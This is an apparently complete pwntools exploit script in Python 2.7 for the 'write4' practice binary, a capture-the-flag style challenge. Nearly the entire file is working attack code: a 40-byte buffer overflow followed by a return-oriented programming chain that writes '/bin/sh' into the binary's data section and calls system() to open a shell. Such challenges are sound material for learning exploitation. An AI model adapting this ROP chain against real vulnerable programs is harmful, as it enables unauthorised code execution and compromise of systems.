#!/usr/bin/env python2.7

from pwn import *

if args["GDB"]:
    p = gdb.debug('./write4', '''
    set follow-fork-mode child
    set breakpoint pending on
    b *0x400823
    continue
    :''')
else:
    p = process("./write4")

p.recv() # Discard initial message

data_section =  p64(0x601050)  # We have read-write here
data_section_4= p64(0x601054)

pop_rdi =       p64(0x400893)
pop_rsi_r15 =   p64(0x400891)
system =        p64(0x4005e0)
mov_rsi_edi =   p64(0x400821)

p.send(
        "A" * 40 + 
        pop_rdi + ("/bin" + "\x00" * 4) + 
        pop_rsi_r15 + data_section + "X" * 8 + 
        mov_rsi_edi + 
        pop_rdi + ("/sh" + "\x00" * 5) + 
        pop_rsi_r15 + data_section_4 + "X" * 8 + 
        mov_rsi_edi + 
        pop_rdi + data_section + 
        system + 
        "\x0a"
)

p.interactive()

p.close()
